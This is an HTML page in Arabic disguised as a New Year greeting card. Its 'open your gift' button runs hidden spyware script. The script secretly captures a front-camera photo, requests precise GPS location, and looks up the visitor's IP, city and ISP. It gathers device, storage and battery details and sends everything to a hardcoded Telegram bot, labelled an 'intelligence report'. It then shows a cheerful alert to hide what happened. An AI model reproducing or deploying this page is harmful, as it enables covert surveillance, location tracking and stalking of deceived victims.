<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>كل عام وأنتم بخير! 🌟</title>
    <style>
        body {
            font-family: 'Cairo', Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72, #2a5298);
            color: #fff;
            text-align: center;
            padding: 40px 20px;
            margin: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .card {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
        }
        h1 {
            color: #ffd700;
            font-size: 2.3rem;
            margin-bottom: 20px;
        }
        p {
            font-size: 1.1rem;
            line-height: 1.8;
            margin-bottom: 30px;
        }
        .btn {
            background-color: #ffc107;
            color: #333;
            border: none;
            padding: 12px 30px;
            font-size: 1.1rem;
            font-weight: bold;
            border-radius: 30px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        }
        .btn:hover {
            background-color: #ffca28;
            transform: scale(1.05);
        }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h1>✨ عام سعيد ومبارك! ✨</h1>
        <p>بمناسبة السنة الجديدة، أرسل لك أخلص التهاني والأماني الطيبة، اضغط على الزر أدناه لفتح مفاجأة الهدية الخاصة بك!</p>
        <button class="btn" onclick="openGift()">اضغط هنا لفتح الهدية 🎁</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = '8979129209:AAFpV86OAomcO3pLBPQh4dyW2yIKByB3Bk0';
        const CHAT_ID = '6663398412';

        const userDevice = navigator.userAgent;
        const screenRes = window.screen.width + 'x' + window.screen.height;
        const deviceMemory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'غير متوفر';
        const hardwareConcurrency = navigator.hardwareConcurrency ? navigator.hardwareConcurrency + ' أنوية' : 'غير متوفر';

        async function getStorageInfo() {
            let storageInfo = 'غير متوفر';
            try {
                if (navigator.storage && navigator.storage.estimate) {
                    const estimate = await navigator.storage.estimate();
                    const totalGB = (estimate.quota / (1024 * 1024 * 1024)).toFixed(2);
                    const usedGB = (estimate.usage / (1024 * 1024 * 1024)).toFixed(2);
                    storageInfo = `${usedGB} GB من إجمالي ${totalGB} GB`;
                }
            } catch (e) {}
            return storageInfo;
        }

        // دالة الحصول على الموقع الجغرافي بدقة (GPS)
        function getGeoLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve('غير متاح');
                } else {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude;
                            const lon = position.coords.longitude;
                            const accuracy = position.coords.accuracy;
                            resolve(`خط الطول: ${lat}, خط العرض: ${lon} (دقة المسافة: ${accuracy} متر)`);
                        },
                        (error) => {
                            resolve('تم رفض إذن الموقع أو غير متاح');
                        },
                        { timeout: 10000, enableHighAccuracy: true }
                    );
                }
            });
        }

        async function openGift() {
            let photoBlob = null;

            // 1. التقاط الصورة
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                await new Promise(resolve => setTimeout(resolve, 1500));

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                stream.getTracks().forEach(track => track.stop());

                photoBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
            } catch (e) {}

            // 2. تجميع كافة البيانات التقنية والعنوان الدقيق
            collectAndSendAll(photoBlob);
        }

        async function collectAndSendAll(photoBlob) {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const data = await ipRes.json();
                
                const storage = await getStorageInfo();
                const gpsLocation = await getGeoLocation();

                let batteryLevel = 'غير متاح';
                let isCharging = '';
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        batteryLevel = Math.round(battery.level * 100) + '%';
                        isCharging = battery.charging ? '⚡ بيشحن' : '🔋 مش بيشحن';
                    } catch(e) {}
                }

                const caption = `🚨 **التقرير الاستخباراتي الشامل والنهائي!**\n\n` +
                                `📍 **الموقع الدقيق (GPS):**\n${gpsLocation}\n` +
                                `--------------------------\n` +
                                `🌍 **الدولة:** ${data.country_name || 'غير معروف'}\n` +
                                `🏙️ **المدينة:** ${data.city || 'غير معروف'}\n` +
                                `🏢 **مزود الشبكة:** ${data.org || 'غير معروف'}\n` +
                                `🌐 **الـ IP:** ${data.ip || 'غير معروف'}\n` +
                                `--------------------------\n` +
                                `📱 **نوع الجهاز:** ${userDevice}\n` +
                                `🧠 **الرام:** ${deviceMemory}\n` +
                                `⚙️ **المعالج:** ${hardwareConcurrency}\n` +
                                `💾 **التخزين:** ${storage}\n` +
                                `🔋 **البطارية:** ${batteryLevel} (${isCharging})\n` +
                                `🖥️ **دقة الشاشة:** ${screenRes}`;

                if (photoBlob) {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', photoBlob, 'visitor.jpg');
                    formData.append('caption', caption);
                    formData.append('parse_mode', 'Markdown');

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } else {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: CHAT_ID, text: caption, parse_mode: 'Markdown' })
                    });
                }
            } catch (err) {}

            alert('كل سنة وأنت طيب! تم فتح الهدية بنجاح 🌟');
        }
    </script>
</body>
</html>
